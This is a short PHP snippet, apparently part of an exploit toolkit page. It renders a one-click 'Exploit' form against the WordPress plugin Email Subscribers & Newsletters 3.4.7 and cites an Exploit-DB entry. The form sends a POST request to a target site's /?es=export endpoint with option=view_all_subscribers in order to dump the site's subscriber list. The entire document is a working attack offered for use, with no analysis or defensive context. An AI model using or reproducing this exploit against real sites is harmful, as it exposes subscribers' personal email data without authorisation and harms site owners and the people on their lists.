<?php
echo "<h3>WordPress Plugin Email Subscribers & Newsletters 3.4.7 - Information Disclosure</h3>";
echo "<a href=\"https://www.exploit-db.com/exploits/43872/\">https://www.exploit-db.com/exploits/43872/</a><br><br>";
echo "<form class=\"wp-form\" action=\"http://".$url."/?es=export\" method=\"post\">&nbsp;";
    echo "option <input type=\"text\" size=\"50\" name=\"option\" value=\"view_all_subscribers\" />&nbsp;";
    echo "<input type=\"submit\" value=\"Exploit\" />";
echo "</form>"; ?>
